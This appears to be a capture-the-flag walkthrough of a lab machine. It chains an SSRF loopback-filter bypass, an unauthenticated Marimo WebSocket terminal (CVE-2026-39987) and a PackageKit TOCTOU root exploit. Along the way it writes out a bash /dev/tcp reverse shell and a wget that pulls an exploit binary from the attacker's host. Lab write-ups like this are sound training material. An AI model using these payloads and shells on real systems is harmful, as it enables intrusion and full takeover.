SSRF — Bypassing the Loopback Filter

The portal page contains a “validate data source URL” feature that performs a server-side fetch. This is a classic SSRF.

Confirm the endpoint

$ curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1"}'

{"ok": false, "message": "Internal or loopback addresses are not permitted."}

Filter bypass

The filter only does string matching. Alternative representations of localhost work:

$ curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0"}'

$ curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1"}'

$ curl -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433"}'   # decimal form of 127.0.0.1
SSRF bypass techniques — 127.0.0.1 can be written as decimal (2130706433), short form (127.1), 0.0.0.0, hex, octal, or URL-encoded. Always try multiple encodings when a filter blocks the obvious forms.

Initial Access — Marimo Unauthenticated WebSocket RCE

Port 8888 hosts Marimo (interactive Python notebook, version ≈ 0.20.4). The main UI requires login, but the terminal WebSocket endpoint does not.

CVE-2026-39987 — /terminal/ws is a WebSocket connected directly to a server-side PTY and does not require authentication, even when the rest of the application is protected by login.

Connect with websocat

$ websocat -k wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws

marimo@cohort:~$ whoami
marimo

Stabilize with a reverse shell

# Attacker
$ nc -lvnp 4444

# Inside the Marimo WebSocket session
bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'

Upgrade the shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z → stty raw -echo; fg → export TERM=xterm

Grab the user flag:

cat ~/user.txt

Privilege Escalation — PackageKit TOCTOU

Identify the vector

dpkg -l | grep -i packagekit

PackageKit is present and the version is intentionally held (status hi). This points to CVE-2026-41651 (Pack2TheRoot).

CVE-2026-41651 — A TOCTOU race condition in PackageKit’s transaction handler. An unprivileged user can force the installation of an arbitrary package as root by racing two InstallFiles calls on the same transaction.

How the race works (simple version)

  1. Send InstallFiles(SIMULATE, dummy.deb) — the SIMULATE flag skips polkit authorization.
  2. Immediately send InstallFiles(NONE, payload.deb) on the same transaction — this overwrites the cached flags and path.
  3. When the idle callback finally runs, PackageKit installs the malicious package as root.
  4. The malicious .deb postinst script drops a SUID bash.

Exploit

On the attacker machine, prepare the exploit binary (example using a public PoC):

$ git clone https://github.com/Vozec/CVE-2026-41651.git
$ cd CVE-2026-41651
$ python3 -m http.server 8080

On the target (as marimo):

cd /tmp
wget http://<YOUR_IP>:8080/cve-2026-41651 -O exploit
chmod +x exploit

rm -f /tmp/.suid_bash /tmp/pk.log
./exploit

Successful output looks similar to:

[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-xxxxx.deb
[+] payload : /tmp/.pk-payload-xxxxx.deb
[*] Transaction : /x_xxxxxxxx
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch ...
[!] PK error 48: Failed to obtain authentication.   # expected, not fatal

Key Takeaways

  • String-based SSRF filters are weak. Alternative representations of localhost (0.0.0.0, 127.1, decimal, URL-encoding) frequently bypass them.
  • Internal status / debug endpoints are gold. Once you have SSRF, always probe common internal paths such as /status, /health, /metrics.
  • Wildcard certificates hint at hidden vhosts. The leaked upstream name must be used as the Host header; connecting by IP alone is not enough.
  • Modern notebook tools can expose unauthenticated terminals. Always check WebSocket endpoints even when the web UI requires login.
  • PackageKit TOCTOU (CVE-2026-41651) is a clean local privilege escalation on affected versions. Look for held / outdated PackageKit packages during post-exploitation enumeration.
